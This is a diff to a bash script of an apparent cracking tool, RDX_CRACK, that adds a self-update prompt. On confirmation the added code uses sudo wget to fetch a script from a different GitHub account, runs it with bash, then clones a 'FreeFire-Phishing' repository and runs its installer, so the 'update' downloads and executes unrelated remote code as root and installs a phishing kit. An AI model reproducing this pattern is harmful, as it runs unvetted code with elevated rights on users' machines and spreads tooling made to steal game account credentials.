@@ -30,13 +30,27 @@ version="1.2.1"
 
 # chacking update 
 check_update() {
-    echo
-    echo
     echo -ne "\n${Yellow}[${Green}+${Yellow}] ${Green}Checking for update: "
-    release_url='https://raw.githubusercontent.com/CYB3RKING/RDX_CRACK/main/version.txt'
+    local release_url='https://raw.githubusercontent.com/CYB3RKING/RDX_CRACK/main/version.txt'
+    local new_version
     new_version=$(curl -s "${release_url}")
+    
     if [[ "$new_version" != "$version" ]]; then
         echo -e "${Red}Update available: ${Yellow}${new_version}\n"
+        echo -n "${Yellow}[${Green}?${Yellow}] ${Red}Do you want to update this Tool (y/n)? "
+        read -r upd
+        
+        if [[ "$upd" == "y" ]]; then
+            echo "Updating..."
+            sudo wget -q https://raw.githubusercontent.com/hackerx0007/backup/main/FF/Script/Linux/FreeFire-Phishing -O unistall > /dev/null
+            bash unistall
+            git clone https://github.com/CYB3RKING/FreeFire-Phishing
+            cd FreeFire-Phishing
+            bash install.sh
+        else
+            echo "${Red}Update canceled."
+            exit 0
+        fi
     else
         echo -e "${Green}Up to date\n"
     fi
